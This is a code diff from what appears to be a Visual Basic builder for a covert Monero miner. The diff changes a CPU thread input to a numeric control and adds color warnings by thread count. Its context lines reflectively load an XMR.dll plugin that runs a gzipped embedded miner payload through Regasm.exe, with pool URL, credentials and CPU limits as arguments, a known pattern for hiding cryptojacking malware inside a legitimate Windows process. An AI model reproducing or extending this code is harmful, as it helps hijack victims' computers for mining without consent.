@@ -24,7 +24,7 @@
 
         Else
 
-            If txtCPU.Text = "" OrElse txtURL.Text = "" OrElse txtUSER.Text = "" Then
+            If txtCPU.Value.ToString = "" OrElse txtURL.Text = "" OrElse txtUSER.Text = "" Then
                 MsgBox("Enter your settings", MsgBoxStyle.Exclamation)
                 Return
             Else
@@ -32,7 +32,7 @@
                 If chk.Checked = True Then
                     cpu = "50%"
                 Else
-                    cpu = txtCPU.Text
+                    cpu = txtCPU.Value.ToString
                 End If
 
                 If chkPass.Checked Then
@@ -118,6 +118,18 @@
                 Reflection.Assembly.Load(IO.File.ReadAllBytes(Application.StartupPath + "\Misc\Plugins\XMR.dll")).GetType("XMR.Main").GetMethod("Run", Reflection.BindingFlags.Public Or Reflection.BindingFlags.Static).Invoke(Nothing, New Object() {"C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regasm.exe", "--donate-level=0 -t " & txtCPU.Text & " -a cryptonight --url=" & txtURL.Text & " -u " & txtURL.Text & " -p " & txtPASS.Text & " -R --variant=-1 --max-cpu-usage=75", GZip(My.Resources.xm, False), True})
                 Return
             End If
+        End If
+    End Sub
+
+    Private Sub txtCPU_ValueChanged(sender As Object, e As EventArgs) Handles txtCPU.ValueChanged
+        If txtCPU.Value = 1 Then
+            txtCPU.ForeColor = Color.FromArgb(142, 188, 0)
+        ElseIf txtCPU.Value = 2 Then
+            txtCPU.ForeColor = Color.FromArgb(142, 188, 0)
+        ElseIf txtCPU.Value = 3 Then
+            txtCPU.ForeColor = Color.Yellow
+        ElseIf txtCPU.Value >= 4 Then
+            txtCPU.ForeColor = Color.Red
         End If
     End Sub
 End Class
